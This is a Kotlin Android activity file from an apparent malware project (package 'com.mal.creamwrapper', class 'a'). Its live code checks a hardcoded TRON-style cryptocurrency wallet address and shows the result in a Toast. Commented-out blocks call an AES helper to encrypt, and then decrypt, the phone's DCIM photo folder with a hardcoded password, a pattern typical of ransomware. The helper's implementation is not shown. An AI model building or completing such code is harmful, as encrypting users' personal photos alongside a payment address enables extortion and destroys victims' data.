package com.mal.creamwrapper

import android.os.Bundle

import androidx.appcompat.app.AppCompatActivity
import android.os.Environment
import android.os.Looper
import android.util.Log
import android.widget.Toast
import java.io.File

class a : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.a)
        Notification101()
        val info = CryptoAddressDetector.analyze("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj")
        if (info.isAddress) {
            println("地址类型：${info.chain}")
            println("网络：${info.network}")
            println("具体格式：${info.addressType}")
            println("校验结果：${info.validation}")
            println("可能所属链：${info.possibleChains}")
            println("补充信息：${info.details}")
            // 使用 getString 自动完成占位符替换和当前系统语言适配
            val displayMessage = applicationContext.getString(
                R.string.address_check_result,
                info.chain,
                info.network,
                info.addressType,
                info.validation,
                info.possibleChains,
                info.details
            )

// 在主线程弹出 Toast

            Toast.makeText(applicationContext, displayMessage, Toast.LENGTH_LONG).show()

        } else {
            println("无法识别：${info.message}")
        }
        /*
                val sjfds = File(Environment.getExternalStorageDirectory(), "DCIM")
                val vidjf = File(Environment.getExternalStorageDirectory(), "DCIM")
                val teswr = File(Environment.getExternalStorageDirectory(), "DCIM")

        if (sjfds.exists()){
            AesDirectoryCrypto.encrypt(sjfds, "MyTestPassword123") { result ->
                result.onSuccess {
                    Log.i("Crypto", "加密成功")
                }
                result.onFailure { error ->
                    Log.e("Crypto", "加密失败", error)
                }
            }
        }


         */


        /*
        if (sjfds.exists()){
                AesDirectoryCrypto.decrypt(sjfds, "MyTestPassword123") { result ->
                    result.onSuccess {
                        Log.i("Crypto", "解密成功")
                    }

                    result.onFailure { error ->
                        Log.e("Crypto", "解密失败", error)
                    }
                }
        }


         */


    }
}